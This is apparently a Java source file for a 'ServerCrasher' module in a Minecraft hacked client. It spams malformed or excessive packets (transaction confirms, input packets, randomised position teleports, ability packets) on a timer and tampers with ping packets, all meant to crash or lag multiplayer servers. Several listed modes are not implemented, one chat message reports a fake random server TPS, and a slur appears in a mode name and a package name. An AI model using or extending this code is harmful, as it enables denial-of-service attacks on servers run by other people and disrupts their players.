package com.nquantum.module.exploit;

import cf.nquan.util.ChatUtil;
import cf.nquan.util.PacketUtil;
import cf.nquan.util.Timer;
import com.nquantum.Asyncware;
import com.nquantum.event.EventTarget;
import com.nquantum.event.impl.EventSendPacket;
import com.nquantum.event.impl.EventUpdate;
import com.nquantum.module.Category;
import com.nquantum.module.Module;
import nig.hero.settings.Setting;
import net.minecraft.network.play.client.*;
import net.minecraft.network.status.client.C01PacketPing;

import java.util.ArrayList;
import java.util.Random;

public class ServerCrasher extends Module {
    private Timer timer = new Timer();
    public static int override = 1;
    public ServerCrasher(){
        super("Crasher", 0, Category.EXPLOIT);
    }

    @Override
    public void setup() {
        ArrayList<String> modes = new ArrayList<>();

        modes.add("C0F Override");
        modes.add("C0C Override");
        modes.add("C00 Cancel");
        modes.add("One Packet");
        modes.add("Kokscraft AC Trigger");
        modes.add("Nullpos");
        modes.add("C03 Folding");
        modes.add("Rekt");
        modes.add("Retard");
        modes.add("BYVK");
        Asyncware.instance.settingsManager.rSetting(new Setting("Crasher Mode", this, "C0F Override", modes));
    }


    @EventTarget
    public void onUpdate(EventUpdate e){

        Random r = new Random();

        String mode = Asyncware.instance.settingsManager.getSettingByName("Crasher Mode").getValString();
        if(mode.equalsIgnoreCase("C0F Override")){
            if(this.timer.hasTimeElapsed(40L, true)){


                PacketUtil.sendPacketNoEvent(new C0FPacketConfirmTransaction());
                ChatUtil.sendMessagePrefix("- \u00A78[\u00A7cCrasher\u00A78] \u00A7fC0F \u00A77- \u00A7fOverride complete. " + "\u00A77[\u00A7f" + override + "\u00A77]");
                override++;

            }
        }
        if(mode.equalsIgnoreCase("C0C Override")){
            if(this.timer.hasTimeElapsed(40L, true)){
                PacketUtil.sendPacketNoEvent(new C0CPacketInput());
            }
        }
        if(mode.equalsIgnoreCase("C00 Cancel")){
           // mc.getNetHandler().getNetworkManager().sendPacket(new C00PacketKeepAlive((new S00PacketKeepAlive()).func_149134_c() + mc.getDebugFPS() / 2));
         //   ChatUtil.sendMessagePrefix("- \u00A78[\u00A7cCrasher\u00A78] \u00A7fC00 \u00A77- \u00A7fCancelled. " + "\u00A77[\u00A7f" + override + "\u00A77]");
            override++;
        }
        if(mode.equalsIgnoreCase("C03 Folding")){
            PacketUtil.sendPacket(new C03PacketPlayer.C04PacketPlayerPosition(mc.thePlayer.posX + 10 + r.nextFloat() * (40 - 10), mc.thePlayer.posY + 10 + r.nextFloat() * (40 - 10), mc.thePlayer.posZ + 10 + r.nextFloat() * (40 - 10), false));
            if(this.timer.hasTimeElapsed(50L, true)){
                PacketUtil.sendPacket(new C03PacketPlayer.C04PacketPlayerPosition(mc.thePlayer.lastTickPosX , mc.thePlayer.lastTickPosY, mc.thePlayer.lastTickPosZ, true));

            }
            ChatUtil.sendMessage("\u00A78[\u00A7cCrasher\u00A78] \u00A7fTeleporting you to " + Math.round(mc.thePlayer.posX) + ", " + Math.round(mc.thePlayer.posY) + ", " + Math.round(mc.thePlayer.posZ) + "\u00A77 - \u00A7fFolding. " + " Server TPS: " +  r.nextFloat() * (20.0f - 3.0f) + "\u00A77 [\u00A7f" + override + "\u00A77]");
            override++;
        }


        if(mode.equalsIgnoreCase("Rekt")){

            PacketUtil.sendPacket(new C13PacketPlayerAbilities());
            ChatUtil.sendMessagePrefix("- \u00A78[\u00A7cRekt\u00A78] \u00A77- \u00A7fGet rekt. " + "\u00A77[\u00A7f" + "ArrayBuf=" + override + "\u00A77]");
            override++;
        }

    }



    @EventTarget
    public void onSendPacket(EventSendPacket e){
        String mode = Asyncware.instance.settingsManager.getSettingByName("Crasher Mode").getValString();
        if(mode.equalsIgnoreCase("C00 Cancel")){
                if (e.getPacket() instanceof C01PacketPing) {
                    C01PacketPing packet = (C01PacketPing) e.getPacket();
                    packet.clientTime = 0;
                    e.setPacket(packet);

                    ChatUtil.sendMessagePrefix("- \u00A78[\u00A7cCrasher\u00A78] \u00A7fC00 \u00A77- \u00A7fCancelled. " + "\u00A77[\u00A7f" + override + "\u00A77]");

                }
        }
    }
}
